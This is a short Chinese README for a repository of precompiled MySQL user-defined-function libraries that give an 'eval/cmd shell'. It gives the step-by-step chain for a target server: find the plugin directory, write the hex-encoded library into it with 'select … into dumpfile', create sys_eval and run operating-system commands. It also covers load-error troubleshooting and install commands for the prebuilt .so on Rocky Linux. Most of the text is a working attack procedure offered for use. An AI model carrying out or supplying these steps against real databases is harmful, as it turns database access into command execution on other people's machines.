# mysql_udf

mysql udf eval/cmd shell

**只适用于MySQL > 5.1**

源码来自https://github.com/mysqludf/lib_mysqludf_sys

dll文件编译自vs2012

    一般过程
    
    >show variables like '%version%';       //查目标Mysql版本
    >show variables like '%plugin%';        //查目标plugin目录
    >select unhex(hex_udf) into dumpfile path/to/plugin/udf.dll;       //通过各种方法导入udf
    >create function sys_eval returns string soname 'udf.dll';         //创建函数
    >select sys_eval(cmd);                  //执行命令

**可能遇到的问题**

 * errno 2
        
        1. udf不存在(有可能被删)
       
 * errno 126
       
        1. 检查编译UDF用到的MySQL版本与目标MySQL版本是否对应
        2. 目标机器是否缺少各种包，如Microsoft Visual C++ 20xx redistributable

 * errno 193

        1. udf文件存在，但文件格式错误 (文件损坏)
		2. x86/x64的udf搞混

## 操作

亲测在下面的环境中有效。在Rocky8中编译lib_mysqludf_sys失败，这个项目就是lib_mysqludf_sys，直接是编译后的文件。

```bash
# 环境
cat /etc/redhat-release
> Rocky Linux release 8.9 (Green Obsidian)
mysql --version
> mysql  Ver 8.0.34 for Linux on x86_64 (MySQL Community Server - GPL)

wget https://github.com/retanoj/mysql_udf/archive/master.zip
unzip master.zip
mv mysql_udf-master/udf_mysql5.6.25_redhat_x64.so /usr/lib64/mysql/plugin/lib_mysqludf_sys.so
chmod 755 /usr/lib64/mysql/plugin/lib_mysqludf_sys.so
# chcon -u system_u -t lib_t /usr/lib64/mysql/plugin/lib_mysqludf_sys.so  # 设置selinux

CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';
```
